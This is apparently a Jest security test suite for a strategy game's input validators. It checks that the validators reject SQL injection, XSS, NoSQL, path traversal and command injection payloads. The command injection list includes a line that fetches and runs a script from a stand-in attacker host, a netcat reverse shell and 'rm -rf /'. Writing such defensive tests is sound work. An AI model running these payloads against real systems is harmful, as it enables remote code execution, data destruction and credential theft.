import { describe, expect, it } from '@jest/globals'
import { schemas } from '../middleware/validation'

/**
 * Security Test Suite
 * Tests protection against common web vulnerabilities
 */

describe('Security Vulnerability Tests', () => {
  describe('SQL Injection Protection', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "admin' --",
      "' UNION SELECT * FROM users WHERE '1'='1",
      "'; EXEC xp_cmdshell('net user hacker password /add'); --",
      "1'; DELETE FROM users WHERE '1'='1",
      "' OR 1=1 --",
      "admin' OR '1'='1' --",
      "'; SHUTDOWN; --",
    ]

    it('should reject SQL injection in username field', () => {
      sqlInjectionPayloads.forEach((payload) => {
        const result = schemas.auth.validate(
          {
            username: payload,
            email: 'test@example.com',
            password: 'SecurePass123!',
          },
          { context: { isRegister: true } },
        )

        expect(result.error).toBeDefined()
        const errorMessage = result.error?.details[0]?.message || ''
        expect(errorMessage).toMatch(/malicious|pattern|invalid/i)
      })
    })

    it('should reject SQL injection in email field', () => {
      sqlInjectionPayloads.forEach((payload) => {
        const result = schemas.auth.validate(
          {
            username: 'validuser',
            email: payload,
            password: 'SecurePass123!',
          },
          { context: { isRegister: true } },
        )

        expect(result.error).toBeDefined()
      })
    })

    it('should reject SQL injection in game name', () => {
      sqlInjectionPayloads.forEach((payload) => {
        const result = schemas.game.validate({
          name: payload,
          maxPlayers: 4,
          mapId: '123e4567-e89b-12d3-a456-426614174000',
        })

        expect(result.error).toBeDefined()
      })
    })
  })

  describe('XSS Protection', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '<object data="javascript:alert(\'XSS\')">',
      '<embed src="javascript:alert(\'XSS\')">',
      '<a href="javascript:alert(\'XSS\')">Click</a>',
      '<script>document.cookie</script>',
      'onclick=alert("XSS")',
      '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    ]

    it('should reject XSS in username field', () => {
      xssPayloads.forEach((payload) => {
        const result = schemas.auth.validate(
          {
            username: payload,
            email: 'test@example.com',
            password: 'SecurePass123!',
          },
          { context: { isRegister: true } },
        )

        expect(result.error).toBeDefined()
      })
    })

    it('should reject XSS in message content', () => {
      xssPayloads.forEach((payload) => {
        const result = schemas.message.validate({
          content: payload,
          roomId: '123e4567-e89b-12d3-a456-426614174000',
        })

        expect(result.error).toBeDefined()
      })
    })

    it('should reject XSS in profile bio', () => {
      xssPayloads.forEach((payload) => {
        const result = schemas.profile.validate({
          bio: payload,
        })

        expect(result.error).toBeDefined()
      })
    })

    it('should reject XSS in map description', () => {
      xssPayloads.forEach((payload) => {
        const result = schemas.map.validate({
          name: 'Test Map',
          description: payload,
          territories: Array(15).fill({ name: 'Territory', continent: 'Continent' }),
        })

        expect(result.error).toBeDefined()
      })
    })
  })

  describe('NoSQL Injection Protection', () => {
    const noSqlPayloads = [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$where": "this.password == \'test\'"}',
      '{"username": {"$regex": ".*"}}',
      '$where: function() { return true }',
      '{"$or": [{"username": "admin"}, {"password": ""}]}',
      '{"password": {"$exists": true}}',
    ]

    it('should reject NoSQL injection patterns', () => {
      noSqlPayloads.forEach((payload) => {
        const result = schemas.auth.validate(
          {
            username: payload,
            email: 'test@example.com',
            password: 'SecurePass123!',
          },
          { context: { isRegister: true } },
        )

        expect(result.error).toBeDefined()
      })
    })
  })

  describe('Input Validation', () => {
    describe('Username Validation', () => {
      it('should accept valid usernames', () => {
        const validUsernames = ['john_doe', 'user123', 'test-user', 'Admin_2024']

        validUsernames.forEach((username) => {
          const result = schemas.auth.validate(
            {
              username,
              email: 'test@example.com',
              password: 'SecurePass123!',
            },
            { context: { isRegister: true } },
          )

          expect(result.error).toBeUndefined()
        })
      })

      it('should reject invalid usernames', () => {
        const invalidUsernames = [
          'ab', // Too short
          'a'.repeat(21), // Too long
          'user@name', // Invalid character
          'user name', // Space not allowed
          'user!name', // Special character not allowed
        ]

        invalidUsernames.forEach((username) => {
          const result = schemas.auth.validate(
            {
              username,
              email: 'test@example.com',
              password: 'SecurePass123!',
            },
            { context: { isRegister: true } },
          )

          expect(result.error).toBeDefined()
        })
      })
    })

    describe('Password Validation', () => {
      it('should accept strong passwords', () => {
        const validPasswords = ['SecurePass123!', 'MyP@ssw0rd', 'Str0ng&Secure', 'Test123$Pass']

        validPasswords.forEach((password) => {
          const result = schemas.auth.validate(
            {
              username: 'testuser',
              email: 'test@example.com',
              password,
            },
            { context: { isRegister: true } },
          )

          expect(result.error).toBeUndefined()
        })
      })

      it('should reject weak passwords', () => {
        const weakPasswords = [
          'short', // Too short
          'nocapitals123!', // No uppercase
          'NOLOWERCASE123!', // No lowercase
          'NoNumbers!', // No numbers
          'NoSpecialChar123', // No special characters
          'password', // Too simple
          '12345678', // Only numbers
        ]

        weakPasswords.forEach((password) => {
          const result = schemas.auth.validate(
            {
              username: 'testuser',
              email: 'test@example.com',
              password,
            },
            { context: { isRegister: true } },
          )

          expect(result.error).toBeDefined()
        })
      })
    })

    describe('Email Validation', () => {
      it('should accept valid emails', () => {
        const validEmails = [
          'user@example.com',
          'test.user@domain.co.uk',
          'user+tag@example.org',
          'user_123@test-domain.com',
        ]

        validEmails.forEach((email) => {
          const result = schemas.auth.validate(
            {
              username: 'testuser',
              email,
              password: 'SecurePass123!',
            },
            { context: { isRegister: true } },
          )

          expect(result.error).toBeUndefined()
        })
      })

      it('should reject invalid emails', () => {
        const invalidEmails = [
          'notanemail',
          '@example.com',
          'user@',
          'user @example.com',
          'user@.com',
          'user@domain',
          'user..name@example.com',
        ]

        invalidEmails.forEach((email) => {
          const result = schemas.auth.validate(
            {
              username: 'testuser',
              email,
              password: 'SecurePass123!',
            },
            { context: { isRegister: true } },
          )

          expect(result.error).toBeDefined()
        })
      })
    })
  })

  describe('Game Data Validation', () => {
    it('should validate game creation data', () => {
      const validGame = {
        name: 'Test Game Room',
        maxPlayers: 4,
        mapId: '123e4567-e89b-12d3-a456-426614174000',
        isPrivate: false,
      }

      const result = schemas.game.validate(validGame)
      expect(result.error).toBeUndefined()
    })

    it('should reject invalid player counts', () => {
      const invalidGames = [
        { name: 'Test', maxPlayers: 1, mapId: '123e4567-e89b-12d3-a456-426614174000' },
        { name: 'Test', maxPlayers: 9, mapId: '123e4567-e89b-12d3-a456-426614174000' },
        { name: 'Test', maxPlayers: 'four', mapId: '123e4567-e89b-12d3-a456-426614174000' },
      ]

      invalidGames.forEach((game) => {
        const result = schemas.game.validate(game)
        expect(result.error).toBeDefined()
      })
    })
  })

  describe('Map Data Validation', () => {
    it('should validate map upload data', () => {
      const validMap = {
        name: 'World Map',
        description: 'A detailed world map for strategic gameplay',
        tags: ['world', 'classic', 'balanced'],
        isPublic: true,
        territories: Array(42).fill({ name: 'Territory', continent: 'Continent' }),
      }

      const result = schemas.map.validate(validMap)
      expect(result.error).toBeUndefined()
    })

    it('should reject maps with too few territories', () => {
      const invalidMap = {
        name: 'Small Map',
        territories: Array(5).fill({ name: 'Territory', continent: 'Continent' }),
      }

      const result = schemas.map.validate(invalidMap)
      expect(result.error).toBeDefined()
    })

    it('should reject maps with too many territories', () => {
      const invalidMap = {
        name: 'Huge Map',
        territories: Array(201).fill({ name: 'Territory', continent: 'Continent' }),
      }

      const result = schemas.map.validate(invalidMap)
      expect(result.error).toBeDefined()
    })
  })

  describe('Path Traversal Protection', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file:///etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ]

    it('should reject path traversal attempts in all string fields', () => {
      pathTraversalPayloads.forEach((payload) => {
        // Test in username
        let result = schemas.auth.validate(
          {
            username: payload,
            email: 'test@example.com',
            password: 'SecurePass123!',
          },
          { context: { isRegister: true } },
        )
        expect(result.error).toBeDefined()

        // Test in game name
        result = schemas.game.validate({
          name: payload,
          maxPlayers: 4,
          mapId: '123e4567-e89b-12d3-a456-426614174000',
        })
        expect(result.error).toBeDefined()
      })
    })
  })

  describe('Command Injection Protection', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| whoami',
      '`cat /etc/passwd`',
      '$(curl evil.com/shell.sh | sh)',
      '&& rm -rf /',
      '; nc -e /bin/sh attacker.com 4444',
    ]

    it('should reject command injection attempts', () => {
      commandInjectionPayloads.forEach((payload) => {
        const result = schemas.auth.validate(
          {
            username: payload,
            email: 'test@example.com',
            password: 'SecurePass123!',
          },
          { context: { isRegister: true } },
        )

        expect(result.error).toBeDefined()
      })
    })
  })
})
